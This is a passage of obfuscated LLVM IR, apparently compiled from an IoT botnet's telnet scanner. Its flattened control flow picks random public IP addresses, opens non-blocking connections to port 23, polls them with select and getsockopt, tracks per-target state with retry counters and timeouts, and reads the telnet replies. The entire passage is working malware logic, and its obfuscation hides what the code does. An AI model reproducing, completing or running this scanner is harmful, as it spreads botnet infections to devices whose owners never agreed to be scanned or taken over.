  %.reload362 = load volatile i32, i32* %.reg2mem359
  %Pivot12 = icmp slt i32 %.reload362, 7
  %79 = select i1 %Pivot12, i32 2001117310, i32 -1403476713
  store i32 %79, i32* %switchVar
  br label %loopEnd

NodeBlock9:                                       ; preds = %loopEntry
  %.reload361 = load volatile i32, i32* %.reg2mem359
  %Pivot10 = icmp slt i32 %.reload361, 8
  %80 = select i1 %Pivot10, i32 -496303514, i32 -320931249
  store i32 %80, i32* %switchVar
  br label %loopEnd

LeafBlock7:                                       ; preds = %loopEntry
  %.reload360 = load volatile i32, i32* %.reg2mem359
  %SwitchLeaf8 = icmp eq i32 %.reload360, 8
  %81 = select i1 %SwitchLeaf8, i32 -1950704811, i32 -964642659
  store i32 %81, i32* %switchVar
  br label %loopEnd

NodeBlock5:                                       ; preds = %loopEntry
  %.reload363 = load volatile i32, i32* %.reg2mem359
  %Pivot6 = icmp slt i32 %.reload363, 5
  %82 = select i1 %Pivot6, i32 2006422667, i32 1134781857
  store i32 %82, i32* %switchVar
  br label %loopEnd

NodeBlock3:                                       ; preds = %loopEntry
  %.reload368 = load volatile i32, i32* %.reg2mem359
  %Pivot4 = icmp slt i32 %.reload368, 2
  %83 = select i1 %Pivot4, i32 2102199951, i32 2012490646
  store i32 %83, i32* %switchVar
  br label %loopEnd

NodeBlock1:                                       ; preds = %loopEntry
  %.reload365 = load volatile i32, i32* %.reg2mem359
  %Pivot2 = icmp slt i32 %.reload365, 3
  %84 = select i1 %Pivot2, i32 -1612605190, i32 -128709614
  store i32 %84, i32* %switchVar
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload367 = load volatile i32, i32* %.reg2mem359
  %Pivot = icmp slt i32 %.reload367, 1
  %85 = select i1 %Pivot, i32 -1720255432, i32 1114189718
  store i32 %85, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload366 = load volatile i32, i32* %.reg2mem359
  %SwitchLeaf = icmp eq i32 %.reload366, 0
  %86 = select i1 %SwitchLeaf, i32 -707832940, i32 -964642659
  store i32 %86, i32* %switchVar
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  %88 = load i32, i32* %2, align 4
  %89 = sext i32 %88 to i64
  %.reload353 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %90 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload353, i64 %89
  %91 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %90, i32 0, i32 8
  %92 = load i8*, i8** %91, align 8
  call void @llvm.memset.p0i8.i64(i8* %92, i8 0, i64 1024, i32 1, i1 false)
  %93 = load i32, i32* %2, align 4
  %94 = sext i32 %93 to i64
  %.reload352 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %95 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload352, i64 %94
  %96 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %95, i32 0, i32 3
  %97 = load i8, i8* %96, align 1
  %98 = icmp ne i8 %97, 0
  %99 = select i1 %98, i32 -1030004273, i32 -1079635734
  store i32 %99, i32* %switchVar
  br label %loopEnd

; <label>:100:                                    ; preds = %loopEntry
  %101 = load i32, i32* %2, align 4
  %102 = sext i32 %101 to i64
  %.reload351 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %103 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload351, i64 %102
  %104 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %103, i32 0, i32 8
  %105 = load i8*, i8** %104, align 8
  store i8* %105, i8** %11, align 8
  %106 = load i32, i32* %2, align 4
  %107 = sext i32 %106 to i64
  %.reload350 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %108 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload350, i64 %107
  %109 = bitcast %struct.telstate_t* %108 to i8*
  call void @llvm.memset.p0i8.i64(i8* %109, i8 0, i64 32, i32 16, i1 false)
  %110 = load i8*, i8** %11, align 8
  %111 = load i32, i32* %2, align 4
  %112 = sext i32 %111 to i64
  %.reload349 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %113 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload349, i64 %112
  %114 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %113, i32 0, i32 8
  store i8* %110, i8** %114, align 8
  %115 = call i32 @getRandomPublicIP()
  %116 = load i32, i32* %2, align 4
  %117 = sext i32 %116 to i64
  %.reload348 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %118 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload348, i64 %117
  %119 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %118, i32 0, i32 1
  store i32 %115, i32* %119, align 4
  store i32 -1784242540, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %121 = load i32, i32* %2, align 4
  %122 = sext i32 %121 to i64
  %.reload347 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %123 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload347, i64 %122
  %124 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %123, i32 0, i32 5
  %125 = load i8, i8* %124, align 1
  %126 = add i8 %125, 1
  store i8 %126, i8* %124, align 1
  %127 = load i32, i32* %2, align 4
  %128 = sext i32 %127 to i64
  %.reload346 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %129 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload346, i64 %128
  %130 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %129, i32 0, i32 5
  %131 = load i8, i8* %130, align 1
  %132 = zext i8 %131 to i64
  %133 = icmp eq i64 %132, 18
  %134 = select i1 %133, i32 338859450, i32 -1309189160
  store i32 %134, i32* %switchVar
  br label %loopEnd

; <label>:135:                                    ; preds = %loopEntry
  %136 = load i32, i32* %2, align 4
  %137 = sext i32 %136 to i64
  %.reload345 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %138 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload345, i64 %137
  %139 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %138, i32 0, i32 5
  store i8 0, i8* %139, align 1
  %140 = load i32, i32* %2, align 4
  %141 = sext i32 %140 to i64
  %.reload344 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %142 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload344, i64 %141
  %143 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %142, i32 0, i32 4
  %144 = load i8, i8* %143, align 2
  %145 = add i8 %144, 1
  store i8 %145, i8* %143, align 2
  store i32 -1309189160, i32* %switchVar
  br label %loopEnd

; <label>:146:                                    ; preds = %loopEntry
  %147 = load i32, i32* %2, align 4
  %148 = sext i32 %147 to i64
  %.reload343 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %149 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload343, i64 %148
  %150 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %149, i32 0, i32 4
  %151 = load i8, i8* %150, align 2
  %152 = zext i8 %151 to i64
  %153 = icmp eq i64 %152, 10
  %154 = select i1 %153, i32 753257416, i32 -184941218
  store i32 %154, i32* %switchVar
  br label %loopEnd

; <label>:155:                                    ; preds = %loopEntry
  %156 = load i32, i32* %2, align 4
  %157 = sext i32 %156 to i64
  %.reload342 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %158 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload342, i64 %157
  %159 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %158, i32 0, i32 3
  store i8 1, i8* %159, align 1
  store i32 -2109142397, i32* %switchVar
  br label %loopEnd

; <label>:160:                                    ; preds = %loopEntry
  store i32 -1784242540, i32* %switchVar
  br label %loopEnd

; <label>:161:                                    ; preds = %loopEntry
  %162 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i16 2, i16* %162, align 4
  %163 = call zeroext i16 @htons(i16 zeroext 23) #13
  %164 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i16 %163, i16* %164, align 2
  %165 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 3
  %166 = getelementptr inbounds [8 x i8], [8 x i8]* %165, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %166, i8 0, i64 8, i32 4, i1 false)
  %167 = load i32, i32* %2, align 4
  %168 = sext i32 %167 to i64
  %.reload341 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %169 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload341, i64 %168
  %170 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %169, i32 0, i32 1
  %171 = load i32, i32* %170, align 4
  %172 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %173 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %172, i32 0, i32 0
  store i32 %171, i32* %173, align 4
  %174 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %175 = load i32, i32* %2, align 4
  %176 = sext i32 %175 to i64
  %.reload340 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %177 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload340, i64 %176
  %178 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %177, i32 0, i32 0
  store i32 %174, i32* %178, align 16
  %179 = load i32, i32* %2, align 4
  %180 = sext i32 %179 to i64
  %.reload339 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %181 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload339, i64 %180
  %182 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %181, i32 0, i32 0
  %183 = load i32, i32* %182, align 16
  %184 = icmp eq i32 %183, -1
  %185 = select i1 %184, i32 1504272223, i32 -46862956
  store i32 %185, i32* %switchVar
  br label %loopEnd

; <label>:186:                                    ; preds = %loopEntry
  store i32 -2109142397, i32* %switchVar
  br label %loopEnd

; <label>:187:                                    ; preds = %loopEntry
  %188 = load i32, i32* %2, align 4
  %189 = sext i32 %188 to i64
  %.reload338 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %190 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload338, i64 %189
  %191 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %190, i32 0, i32 0
  %192 = load i32, i32* %191, align 16
  %193 = load i32, i32* %2, align 4
  %194 = sext i32 %193 to i64
  %.reload337 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %195 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload337, i64 %194
  %196 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %195, i32 0, i32 0
  %197 = load i32, i32* %196, align 16
  %198 = call i32 (i32, i32, ...) @fcntl(i32 %197, i32 3, i8* null)
  %199 = or i32 %198, 2048
  %200 = call i32 (i32, i32, ...) @fcntl(i32 %192, i32 4, i32 %199)
  %201 = load i32, i32* %2, align 4
  %202 = sext i32 %201 to i64
  %.reload336 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %203 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload336, i64 %202
  %204 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %203, i32 0, i32 0
  %205 = load i32, i32* %204, align 16
  %206 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %207 = call i32 @connect(i32 %205, %struct.sockaddr* %206, i32 16)
  %208 = icmp eq i32 %207, -1
  %209 = select i1 %208, i32 1603939757, i32 -1801173004
  store i32 %209, i32* %switchVar
  br label %loopEnd

; <label>:210:                                    ; preds = %loopEntry
  %211 = call i32* @__errno_location() #13
  %212 = load i32, i32* %211, align 4
  %213 = icmp ne i32 %212, 115
  %214 = select i1 %213, i32 -1901595993, i32 -1801173004
  store i32 %214, i32* %switchVar
  br label %loopEnd

; <label>:215:                                    ; preds = %loopEntry
  %216 = load i32, i32* %2, align 4
  %217 = sext i32 %216 to i64
  %.reload335 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %218 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload335, i64 %217
  %219 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %218, i32 0, i32 0
  %220 = load i32, i32* %219, align 16
  %221 = call i32 @sclose(i32 %220)
  %222 = load i32, i32* %2, align 4
  %223 = sext i32 %222 to i64
  %.reload334 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %224 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload334, i64 %223
  %225 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %224, i32 0, i32 3
  store i8 1, i8* %225, align 1
  store i32 1070615940, i32* %switchVar
  br label %loopEnd

; <label>:226:                                    ; preds = %loopEntry
  %227 = load i32, i32* %2, align 4
  %228 = sext i32 %227 to i64
  %.reload333 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %229 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload333, i64 %228
  %230 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %229, i32 0, i32 2
  store i8 1, i8* %230, align 8
  %231 = load i32, i32* %2, align 4
  %232 = sext i32 %231 to i64
  %.reload332 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %233 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload332, i64 %232
  %234 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %233, i32 0, i32 6
  store i32 0, i32* %234, align 4
  store i32 1070615940, i32* %switchVar
  br label %loopEnd

; <label>:235:                                    ; preds = %loopEntry
  store i32 2003215975, i32* %switchVar
  br label %loopEnd

; <label>:236:                                    ; preds = %loopEntry
  %237 = load i32, i32* %2, align 4
  %238 = sext i32 %237 to i64
  %.reload331 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %239 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload331, i64 %238
  %240 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %239, i32 0, i32 6
  %241 = load i32, i32* %240, align 4
  %242 = icmp eq i32 %241, 0
  %243 = select i1 %242, i32 423695040, i32 1909701570
  store i32 %243, i32* %switchVar
  br label %loopEnd

; <label>:244:                                    ; preds = %loopEntry
  %245 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %246 = load i32, i32* %2, align 4
  %247 = sext i32 %246 to i64
  %.reload330 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %248 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload330, i64 %247
  %249 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %248, i32 0, i32 6
  store i32 %245, i32* %249, align 4
  store i32 1909701570, i32* %switchVar
  br label %loopEnd

; <label>:250:                                    ; preds = %loopEntry
  store i32 -224152797, i32* %switchVar
  br label %loopEnd

; <label>:251:                                    ; preds = %loopEntry
  %252 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i32 0, i32 0
  %253 = getelementptr inbounds [16 x i64], [16 x i64]* %252, i64 0, i64 0
  %254 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %253) #2, !srcloc !5
  %255 = extractvalue { i64, i64* } %254, 0
  %256 = extractvalue { i64, i64* } %254, 1
  %257 = trunc i64 %255 to i32
  store i32 %257, i32* %12, align 4
  %258 = ptrtoint i64* %256 to i64
  %259 = trunc i64 %258 to i32
  store i32 %259, i32* %13, align 4
  store i32 175333005, i32* %switchVar
  br label %loopEnd

; <label>:260:                                    ; preds = %loopEntry
  store i32 -1046455695, i32* %switchVar
  br label %loopEnd

; <label>:261:                                    ; preds = %loopEntry
  %262 = load i32, i32* %2, align 4
  %263 = sext i32 %262 to i64
  %.reload329 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %264 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload329, i64 %263
  %265 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %264, i32 0, i32 0
  %266 = load i32, i32* %265, align 16
  %267 = srem i32 %266, 64
  %268 = zext i32 %267 to i64
  %269 = shl i64 1, %268
  %270 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i32 0, i32 0
  %271 = load i32, i32* %2, align 4
  %272 = sext i32 %271 to i64
  %.reload328 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %273 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload328, i64 %272
  %274 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %273, i32 0, i32 0
  %275 = load i32, i32* %274, align 16
  %276 = sdiv i32 %275, 64
  %277 = sext i32 %276 to i64
  %278 = getelementptr inbounds [16 x i64], [16 x i64]* %270, i64 0, i64 %277
  %279 = load i64, i64* %278, align 8
  %280 = or i64 %279, %269
  store i64 %280, i64* %278, align 8
  %281 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i32 0, i32 0
  store i64 0, i64* %281, align 8
  %282 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i32 0, i32 1
  store i64 10000, i64* %282, align 8
  %283 = load i32, i32* %2, align 4
  %284 = sext i32 %283 to i64
  %.reload327 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %285 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload327, i64 %284
  %286 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %285, i32 0, i32 0
  %287 = load i32, i32* %286, align 16
  %288 = add nsw i32 %287, 1
  %289 = call i32 @select(i32 %288, %struct.__sigset_t* null, %struct.__sigset_t* %4, %struct.__sigset_t* null, %struct.timeval* %5)
  store i32 %289, i32* %3, align 4
  %290 = load i32, i32* %3, align 4
  %291 = icmp eq i32 %290, 1
  %292 = select i1 %291, i32 -631768460, i32 805067737
  store i32 %292, i32* %switchVar
  br label %loopEnd

; <label>:293:                                    ; preds = %loopEntry
  store i32 4, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %294 = load i32, i32* %2, align 4
  %295 = sext i32 %294 to i64
  %.reload326 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %296 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload326, i64 %295
  %297 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %296, i32 0, i32 0
  %298 = load i32, i32* %297, align 16
  %299 = bitcast i32* %7 to i8*
  %300 = call i32 @getsockopt(i32 %298, i32 1, i32 4, i8* %299, i32* %6) #2
  %301 = load i32, i32* %7, align 4
  %302 = icmp ne i32 %301, 0
  %303 = select i1 %302, i32 -2100809328, i32 752385849
  store i32 %303, i32* %switchVar
  br label %loopEnd

; <label>:304:                                    ; preds = %loopEntry
  %305 = load i32, i32* %2, align 4
  %306 = sext i32 %305 to i64
  %.reload325 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %307 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload325, i64 %306
  %308 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %307, i32 0, i32 0
  %309 = load i32, i32* %308, align 16
  %310 = call i32 @sclose(i32 %309)
  %311 = load i32, i32* %2, align 4
  %312 = sext i32 %311 to i64
  %.reload324 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %313 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload324, i64 %312
  %314 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %313, i32 0, i32 2
  store i8 0, i8* %314, align 8
  %315 = load i32, i32* %2, align 4
  %316 = sext i32 %315 to i64
  %.reload323 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %317 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload323, i64 %316
  %318 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %317, i32 0, i32 3
  store i8 1, i8* %318, align 1
  store i32 -1760267413, i32* %switchVar
  br label %loopEnd

; <label>:319:                                    ; preds = %loopEntry
  %320 = load i32, i32* %2, align 4
  %321 = sext i32 %320 to i64
  %.reload322 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %322 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload322, i64 %321
  %323 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %322, i32 0, i32 0
  %324 = load i32, i32* %323, align 16
  %325 = load i32, i32* %2, align 4
  %326 = sext i32 %325 to i64
  %.reload321 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %327 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload321, i64 %326
  %328 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %327, i32 0, i32 0
  %329 = load i32, i32* %328, align 16
  %330 = call i32 (i32, i32, ...) @fcntl(i32 %329, i32 3, i8* null)
  %331 = and i32 %330, -2049
  %332 = call i32 (i32, i32, ...) @fcntl(i32 %324, i32 4, i32 %331)
  %333 = load i32, i32* %2, align 4
  %334 = sext i32 %333 to i64
  %.reload320 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %335 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload320, i64 %334
  %336 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %335, i32 0, i32 6
  store i32 0, i32* %336, align 4
  %337 = load i32, i32* %2, align 4
  %338 = sext i32 %337 to i64
  %.reload319 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %339 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload319, i64 %338
  %340 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %339, i32 0, i32 7
  store i16 0, i16* %340, align 16
  %341 = load i32, i32* %2, align 4
  %342 = sext i32 %341 to i64
  %.reload318 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %343 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload318, i64 %342
  %344 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %343, i32 0, i32 8
  %345 = load i8*, i8** %344, align 8
  call void @llvm.memset.p0i8.i64(i8* %345, i8 0, i64 1024, i32 1, i1 false)
  %346 = load i32, i32* %2, align 4
  %347 = sext i32 %346 to i64
  %.reload317 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %348 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload317, i64 %347
  %349 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %348, i32 0, i32 2
  store i8 2, i8* %349, align 8
  store i32 -2109142397, i32* %switchVar
  br label %loopEnd

; <label>:350:                                    ; preds = %loopEntry
  store i32 1958952140, i32* %switchVar
  br label %loopEnd

; <label>:351:                                    ; preds = %loopEntry
  %352 = load i32, i32* %3, align 4
  %353 = icmp eq i32 %352, -1
  %354 = select i1 %353, i32 -1921367268, i32 766928625
  store i32 %354, i32* %switchVar
  br label %loopEnd

; <label>:355:                                    ; preds = %loopEntry
  %356 = load i32, i32* %2, align 4
  %357 = sext i32 %356 to i64
  %.reload316 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %358 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload316, i64 %357
  %359 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %358, i32 0, i32 0
  %360 = load i32, i32* %359, align 16
  %361 = call i32 @sclose(i32 %360)
  %362 = load i32, i32* %2, align 4
  %363 = sext i32 %362 to i64
  %.reload315 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %364 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload315, i64 %363
  %365 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %364, i32 0, i32 2
  store i8 0, i8* %365, align 8
  %366 = load i32, i32* %2, align 4
  %367 = sext i32 %366 to i64
  %.reload314 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %368 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload314, i64 %367
  %369 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %368, i32 0, i32 3
  store i8 1, i8* %369, align 1
  store i32 766928625, i32* %switchVar
  br label %loopEnd

; <label>:370:                                    ; preds = %loopEntry
  store i32 1958952140, i32* %switchVar
  br label %loopEnd

; <label>:371:                                    ; preds = %loopEntry
  %372 = load i32, i32* %2, align 4
  %373 = sext i32 %372 to i64
  %.reload313 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %374 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload313, i64 %373
  %375 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %374, i32 0, i32 6
  %376 = load i32, i32* %375, align 4
  %377 = add i32 %376, 10
  %378 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %379 = icmp ult i32 %377, %378
  %380 = select i1 %379, i32 -1864776867, i32 581439
  store i32 %380, i32* %switchVar
  br label %loopEnd

; <label>:381:                                    ; preds = %loopEntry
  %382 = load i32, i32* %2, align 4
  %383 = sext i32 %382 to i64
  %.reload312 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %384 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload312, i64 %383
  %385 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %384, i32 0, i32 0
  %386 = load i32, i32* %385, align 16
  %387 = call i32 @sclose(i32 %386)
  %388 = load i32, i32* %2, align 4
  %389 = sext i32 %388 to i64
  %.reload311 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %390 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload311, i64 %389
  %391 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %390, i32 0, i32 2
  store i8 0, i8* %391, align 8
  %392 = load i32, i32* %2, align 4
  %393 = sext i32 %392 to i64
  %.reload310 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %394 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload310, i64 %393
  %395 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %394, i32 0, i32 3
  store i8 1, i8* %395, align 1
  store i32 581439, i32* %switchVar
  br label %loopEnd

; <label>:396:                                    ; preds = %loopEntry
  store i32 2003215975, i32* %switchVar
  br label %loopEnd

; <label>:397:                                    ; preds = %loopEntry
  %398 = load i32, i32* %2, align 4
  %399 = sext i32 %398 to i64
  %.reload309 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %400 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload309, i64 %399
  %401 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %400, i32 0, i32 6
  %402 = load i32, i32* %401, align 4
  %403 = icmp eq i32 %402, 0
  %404 = select i1 %403, i32 -1949599317, i32 1641732337
  store i32 %404, i32* %switchVar
  br label %loopEnd

; <label>:405:                                    ; preds = %loopEntry
  %406 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %407 = load i32, i32* %2, align 4
  %408 = sext i32 %407 to i64
  %.reload308 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %409 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload308, i64 %408
  %410 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %409, i32 0, i32 6
  store i32 %406, i32* %410, align 4
  store i32 1641732337, i32* %switchVar
  br label %loopEnd

; <label>:411:                                    ; preds = %loopEntry
  %412 = load i32, i32* %2, align 4
  %413 = sext i32 %412 to i64
  %.reload307 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %414 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload307, i64 %413
  %415 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %414, i32 0, i32 0
  %416 = load i32, i32* %415, align 16
  %417 = load i32, i32* %2, align 4
  %418 = sext i32 %417 to i64
  %.reload306 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %419 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload306, i64 %418
  %420 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %419, i32 0, i32 8
  %421 = load i8*, i8** %420, align 8
  %422 = load i32, i32* %2, align 4
  %423 = sext i32 %422 to i64
  %.reload305 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %424 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload305, i64 %423
  %425 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %424, i32 0, i32 7
  %426 = load i16, i16* %425, align 16
  %427 = zext i16 %426 to i32
  %428 = call i32 @readUntil(i32 %416, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.25, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %421, i32 1024, i32 %427)
  %429 = icmp ne i32 %428, 0
  %430 = select i1 %429, i32 814894637, i32 -2079615768
  store i32 %430, i32* %switchVar
  br label %loopEnd

; <label>:431:                                    ; preds = %loopEntry
